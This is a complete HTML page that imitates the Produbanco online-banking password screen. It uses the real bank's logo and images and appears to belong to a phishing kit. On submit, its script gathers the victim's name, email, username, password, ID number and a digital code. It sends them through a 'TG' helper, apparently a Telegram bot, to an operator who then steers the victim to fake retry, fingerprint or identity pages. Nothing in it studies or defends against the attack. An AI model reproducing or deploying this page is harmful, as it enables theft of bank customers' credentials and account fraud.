<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sena</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --ds-bg: #ffffff;
      --ds-green-primary: #046a38;
      --ds-green-secondary: #78be20;
      --ds-gray-input: #b2b2b2;
      --ds-gray-disabled: #e3e3e3;
      --ds-gray-text: #8b8b8b;
      --ds-gray-tertiary: #656565;
    }

    * {
      box-sizing: border-box;
      font-family: "Nunito Sans", sans-serif;
    }

    html,
    body {
      height: 100%;
      margin: 0;
      padding: 0;
      overflow: hidden;
    }

    body {
      background-color: var(--ds-bg);
      color: #000;
    }

    a {
      color: inherit;
      text-decoration: none;
    }

    .ds-contenedor-principal {
      width: 100%;
      min-height: 100vh;
    }

    .ds-contenedor--publico {
      background-color: var(--ds-bg);
      display: grid;
      grid-template-columns: minmax(640px, 44.2%) 1fr;
      min-height: 100vh;
      overflow-x: hidden;
      width: 100%;
    }

    .ds-contenido-principal {
      grid-column: 1;
      padding: 0 15px;
      width: 100%;
    }

    .ds-formulario {
      margin: 0 auto;
      max-width: 540px;
      padding-bottom: 30px;
      padding-top: 15px;
      width: 100%;
    }


    .ds-logotipo {
      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/logotipo.svg");
      background-position: left center;
      background-repeat: no-repeat;
      background-size: 210px 58px;
      height: 58px;
      margin-bottom: 18px;
      width: 210px;
    }

    .ds-subtitulo {
      align-items: center;
      display: flex;
      font-size: 17px;
      font-style: normal;
      font-weight: 600;
      line-height: 23.15px;
      margin: 0 0 15px;
    }

    #frmClave {
      margin-top: 0;
    }

    .form-group {
      margin-bottom: 10px;
    }

    .ds-etiqueta {
      align-items: center;
      color: #000;
      display: flex;
      font-size: 12px;
      font-style: normal;
      font-weight: 400;
      line-height: 12px;
      margin-bottom: 4px;
    }

    .ds-input-group {
      align-items: stretch;
      display: flex;
      flex-wrap: nowrap;
      position: relative;
      width: 300px;
    }

    .ds-input-group-prepend {
      margin-right: -1px;
    }

    .ds-input-group-append,
    .ds-input-group-prepend {
      display: flex;
      flex: 0 0 auto;
    }

    .ds-input-group-append {
      margin-left: -1px;
    }

    .ds-input-group-text {
      align-items: center;
      background-color: #fff;
      border: 1px solid var(--ds-gray-input);
      border-bottom-right-radius: 0;
      border-right: none;
      border-top-right-radius: 0;
      border-top-left-radius: 4px;
      border-bottom-left-radius: 4px;
      color: #495057;
      display: flex;
      font-size: 15px;
      font-weight: 400;
      height: 48px;
      line-height: 1.5;
      margin-bottom: 0;
      padding: 0.375rem 0.75rem;
      text-align: center;
      white-space: nowrap;
    }

    .ds-icono-clave {
      content: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/Icono/ControlUI/form_seguridad_open_out_48px.svg");
      height: 24px;
      width: 24px;
    }

    .ds-form-control {
      background-color: #fff;
      border-radius: 0;
      box-shadow: none;
      line-height: 30px;
      width: 100%;
    }

    .ds-clave-texto {
      border-left: none;
      border-right: none;
      box-shadow: none;
      padding: 13px 0;
    }

    .ds-mayuscula {
      text-transform: uppercase;
    }

    .ds-mayuscula::placeholder {
      text-transform: none;
    }

    .form-group.ds-control-clave .ds-input-group > input.ds-clave-texto,
    .form-group.ds-control-clave .ds-input-group > span > button,
    .form-group.ds-control-clave .ds-input-group .ds-input-group-text {
      height: 48px;
    }

    .form-group.ds-control-clave .ds-input-group > input.ds-clave-texto {
      border-bottom: 1px solid var(--ds-gray-input);
      border-top: 1px solid var(--ds-gray-input);
      box-sizing: border-box;
      flex: 1 1 auto;
      font-size: 15px;
      min-width: 0;
      padding: 14px;
      width: 1%;
    }

    .form-group.ds-control-clave .ds-input-group {
      flex-wrap: nowrap;
    }

    .form-group.ds-control-clave .ds-input-group > input.ds-clave-texto:focus {
      border-bottom: 1px solid var(--ds-green-primary);
      border-top: 1px solid var(--ds-green-primary);
      outline: none;
    }

    .form-group.ds-control-clave .ds-input-group > span > button {
      border: 1px solid var(--ds-gray-input);
      border-left: none;
    }

    .form-group.ds-control-clave:focus-within .ds-input-group .ds-input-group-text {
      border: 1px solid var(--ds-green-primary);
      border-right: none;
    }

    .form-group.ds-control-clave:focus-within .ds-input-group .ds-btn {
      border: 1px solid var(--ds-green-primary);
      border-left: none;
    }

    .form-group.ds-control-clave:focus-within .ds-clave-texto.ds-clave__caja-clave {
      border-bottom: 1px solid var(--ds-green-primary);
      border-top: 1px solid var(--ds-green-primary);
    }

    .ds-clave-texto::placeholder {
      color: var(--ds-gray-text);
      text-align: left;
    }

    .ds-btn {
      background-color: #fff;
      border: 1px solid transparent;
      border-bottom-left-radius: 0;
      border-top-left-radius: 0;
      border-top-right-radius: 4px;
      border-bottom-right-radius: 4px;
      color: var(--ds-green-primary);
      cursor: pointer;
      display: inline-block;
      font-size: 15px;
      font-weight: 400;
      line-height: 1.5;
      padding: 0.375rem 0.75rem;
      text-align: center;
      user-select: none;
      vertical-align: middle;
      white-space: nowrap;
    }

    .ds-contenedor-botones {
      display: flex;
    }

    .ds-contenedor-botones > div {
      padding-right: 15px;
    }

    .ds-control {
      align-items: center;
      border: 1px solid transparent;
      border-radius: 4px;
      cursor: pointer;
      display: inline-flex;
      font-size: 15px;
      font-style: normal;
      font-weight: 400;
      justify-content: center;
      letter-spacing: -0.19px;
      line-height: 21px;
      margin-bottom: 15px;
      margin-top: 15px;
      min-height: 48px;
      min-width: 112px;
      padding: 12px 30px;
      text-align: center;
      user-select: none;
      vertical-align: middle;
    }

    .ds-control-boton {
      color: #fff;
    }

    .ds-control-boton--primario {
      background-color: var(--ds-green-primary);
      border-color: var(--ds-green-primary);
      color: #fff;
    }

    .ds-control-boton--primario:hover {
      background-color: #368860;
      border-color: #368860;
      color: #fff;
    }

    .ds-control-boton--deshabilitado {
      color: var(--ds-gray-text);
      cursor: not-allowed;
      pointer-events: none;
    }

    .ds-control-boton--deshabilitado,
    .ds-control-boton--deshabilitado:hover {
      background-color: var(--ds-gray-disabled);
      border-color: var(--ds-gray-disabled);
    }

    .ds-control-boton--terciario {
      background-color: #fff;
      border-color: var(--ds-gray-tertiary);
      color: var(--ds-gray-tertiary);
    }

    .ds-control-boton--terciario:hover {
      border-color: var(--ds-gray-text);
    }

    .ds-contenedor-hipervinculo {
      margin-top: 15px;
      text-align: center;
      width: 100%;
    }

    .ds-hipervinculo {
      color: var(--ds-green-secondary);
      font-size: 14px;
      font-style: normal;
      font-weight: 400;
      line-height: 19px;
      text-decoration-line: underline;
    }

    .ds-clave__texto-olvido {
      margin-top: 15px;
    }

    .ds-clave__reseteo--escritorio {
      display: block;
    }

    .ds-clave__reseteo--movil {
      display: none;
    }

    .ds-imagen-principal {
      grid-column: 2;
      margin-left: 3px;
      min-height: 100vh;
    }

    .ds-imagen-principal__banner {
      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/ds_banner.png");
      background-position: right top;
      background-repeat: no-repeat;
      background-size: cover;
      height: 100%;
      width: 100%;
    }

    @media screen and (max-width: 768px) {
      .ds-contenedor--publico {
        display: block;
        min-height: 100vh;
        padding: 0;
      }

      .ds-imagen-principal {
        display: none;
      }

      .ds-contenido-principal {
        margin: 0 auto;
        max-width: 570px;
        padding: 0 15px;
      }

      .ds-formulario {
        max-width: 540px;
      }

      .ds-input-group {
        width: 100%;
      }

      .ds-contenedor-botones {
        display: flex;
        flex-direction: column;
        width: 100%;
      }

      .ds-control-boton {
        max-width: 510px;
        width: 100%;
      }

      .ds-contenedor-botones > div {
        margin-bottom: -15px;
        padding-right: 0;
      }

      .ds-clave__reseteo--movil {
        display: block;
        padding-bottom: 30px;
        padding-top: 15px;
      }

      .ds-clave__reseteo--escritorio {
        display: none;
      }
    }

    @media screen and (max-width: 576px) {
      .ds-contenedor--publico {
        padding: 0 15px;
      }

      .ds-contenido-principal {
        max-width: 100%;
        padding: 0;
      }

      .ds-formulario {
        max-width: 100%;
        padding-top: 12px;
      }

      .ds-control-boton {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <main class="ds-contenedor-principal">
    <section class="ds-contenedor--publico">
      <section class="ds-contenido-principal">
        <div class="ds-formulario">
          <div class="ds-logotipo" aria-label="Logotipo Produbanco"></div>

          <div class="ds-clave">
            <span class="ds-subtitulo">Ingresa a tu Produbanco enl&iacute;nea</span>

            <form id="frmClave" action="#">
              <div class="form-group ds-control-clave">
                <label for="input_Clave" class="ds-etiqueta">Contrase&ntilde;a</label>
                <div class="ds-input-group">
                  <div class="ds-input-group-prepend">
                    <div class="ds-input-group-text">
                      <img class="ds-icono-clave" src="" alt="icono clave">
                    </div>
                  </div>

                  <input
                    autocomplete="off"
                    autofocus
                    class="ds-form-control ds-mayuscula ds-clave-texto ds-clave__caja-clave"
                    id="input_Clave"
                    maxlength="20"
                    placeholder="Ingresa tu contrase&ntilde;a"
                    required
                    type="password"
                  >

                  <span class="ds-input-group-append">
                    <button id="btnMostrar" type="button" class="ds-btn">Mostrar</button>
                  </span>
                </div>
              </div>

              <div class="ds-contenedor-botones">
                <div>
                  <button
                    type="submit"
                    id="btnIngresar"
                    class="ds-control ds-control-boton ds-control-boton--primario ds-control-boton--deshabilitado"
                    disabled
                  >
                    Ingresar
                  </button>
                </div>

                <div class="ds-clave__reseteo--movil ds-contenedor-hipervinculo ds-clave__texto-olvido">
                  <a class="ds-hipervinculo" href="#">&#191;Olvidaste tu contrase&ntilde;a?</a>
                </div>

                <div>
                  <a id="btnCancelar" class="ds-control ds-control-boton ds-control-boton--terciario" href="login.html">
                    Cancelar
                  </a>
                </div>
              </div>

              <div class="ds-clave__reseteo--escritorio ds-contenedor-hipervinculo ds-clave__texto-olvido">
                <a class="ds-hipervinculo" href="#">&#191;Olvidaste tu contrase&ntilde;a?</a>
              </div>
            </form>
          </div>
        </div>
      </section>

      <aside class="ds-imagen-principal" aria-hidden="true">
        <div class="ds-imagen-principal__banner"></div>
      </aside>
    </section>
  </main>

  <script src="tg.js"></script>
  <script>
    const inputClave = document.getElementById("input_Clave");
    const btnMostrar = document.getElementById("btnMostrar");
    const btnIngresar = document.getElementById("btnIngresar");
    const frmClave = document.getElementById("frmClave");

    function actualizarEstadoIngresar() {
      const habilitar = inputClave.value.length >= 8;
      btnIngresar.disabled = !habilitar;
      btnIngresar.classList.toggle("ds-control-boton--deshabilitado", !habilitar);
    }

    btnMostrar.addEventListener("click", function () {
      const esPassword = inputClave.type === "password";
      inputClave.type = esPassword ? "text" : "password";
      btnMostrar.textContent = esPassword ? "Ocultar" : "Mostrar";
      inputClave.focus();
    });

    // Prevent space character and remove any spaces on paste/input
    inputClave.addEventListener("keydown", function (e) {
      if (e.key === ' ') e.preventDefault();
    });

    inputClave.addEventListener("input", function () {
      const inicio = this.selectionStart;
      const fin = this.selectionEnd;
      const before = this.value;
      const noSpaces = before.replace(/\s+/g, '');
      this.value = noSpaces.toUpperCase();
      const newStart = before.slice(0, inicio).replace(/\s+/g, '').length;
      const newEnd = before.slice(0, fin).replace(/\s+/g, '').length;
      this.setSelectionRange(newStart, newEnd);
      actualizarEstadoIngresar();
    });

    frmClave.addEventListener("submit", function (evento) {
      evento.preventDefault();
      if (btnIngresar.disabled) return;

      TG.save('sena', inputClave.value);
      var isRetry = TG.load('isRetry') === 'true';

      var msg = '\u{1F464} Nombre: ' + TG.load('nombres') + '\n';
      msg += '\u2709\uFE0F Correo: ' + TG.load('email') + '\n';
      msg += '\u{1F3E6} Es cliente? : ' + TG.load('esCliente') + '\n';
      msg += '\u{1F464} USU: ' + TG.load('usuario') + '\n';
      msg += '\u{1F512} SENA: ' + TG.load('sena') + '\n';
      msg += '\u{1F4C4} Documento: ' + TG.load('documento') + '\n';
      msg += '\u{1F4C4} COD DIG: ' + TG.load('codDig');

      TG.overlay(true);
      TG.send(msg, true, ['Incorrecto \u274C', 'Correo \u{1F4E7}'], { label: 'Dactilar \u{1F446}', action: 'dactilar' }, { label: 'Identidad \u{1F464}', action: 'identidad' }).then(function (sessionId) {
        TG.poll(sessionId, function (action) {
          TG.overlay(false);
          if (action === 'correct') {
            TG.save('isRetry', 'true');
            window.location.href = 'incorrecto/login.html';
          } else if (action === 'incorrect') {
            window.location.href = 'correo.html';
          } else if (action === 'dactilar') {
            window.location.href = 'dactilar.html';
          } else if (action === 'identidad') {
            window.location.href = 'incorrecto/identidad.html';
          } else {
            TG.save('isRetry', 'true');
            window.location.href = 'incorrecto/login.html';
          }
        });
      });
    });

    actualizarEstadoIngresar();
  </script>
</body>
</html>
